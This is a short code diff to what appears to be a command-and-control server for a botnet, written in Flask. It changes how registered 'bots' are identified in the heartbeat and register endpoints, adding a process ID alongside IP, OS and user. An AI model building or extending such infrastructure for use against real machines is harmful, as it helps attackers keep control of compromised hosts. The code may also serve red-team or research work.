@@ -123,7 +123,7 @@ def heartbeat():
     """
 
     # Error checking 
-    error = posterrorcheck(request, 'ip', 'user')
+    error = posterrorcheck(request, 'ip', 'pid')
     if error is not True:
         return error 
 
@@ -131,12 +131,12 @@ def heartbeat():
     data = request.form
 
     ip = data['ip']
-    user = data['user']
+    pid = data['pid']
 
     # API Endpoint logic 
     # See if the bot exists, and if it does, update and refresh the timestamp    
     try:
-        query_bot = Bot.query.filter_by(ip=ip).filter_by(user=user).first()
+        query_bot = Bot.query.filter_by(ip=ip).filter_by(pid=pid).first()
         query_bot.set_timestamp(datetime.now())
 
     except Exception as e:
@@ -183,7 +183,7 @@ def register():
     """
 
     # Error checking 
-    error = posterrorcheck(request, 'registerkey', 'ip', 'os', 'user')
+    error = posterrorcheck(request, 'registerkey', 'ip', 'os', 'user', 'pid')
     if error is not True:
         return error 
 
@@ -193,6 +193,7 @@ def register():
     bot_ip = data['ip']
     bot_os = data['os']
     bot_user = data['user']
+    bot_pid = data['pid']
 
     # API Endpoint logic 
     # Check if the registerkey is correct 
@@ -201,7 +202,7 @@ def register():
 
     # Check bot already exists in the database 
     try:
-        query_bot = Bot.query.filter_by(ip=bot_ip).filter_by(user=bot_user).first()
+        query_bot = Bot.query.filter_by(ip=bot_ip).filter_by(pid=bot_pid).first()
     except Exception as e:
         print("[!]", e)
 
@@ -210,7 +211,7 @@ def register():
 
     else:
         print("[+] Added a new bot !")
-        bot = Bot(bot_ip, bot_os, bot_user)
+        bot = Bot(bot_ip, bot_os, bot_user, bot_pid)
         db.session.add(bot)
         db.session.commit()
 
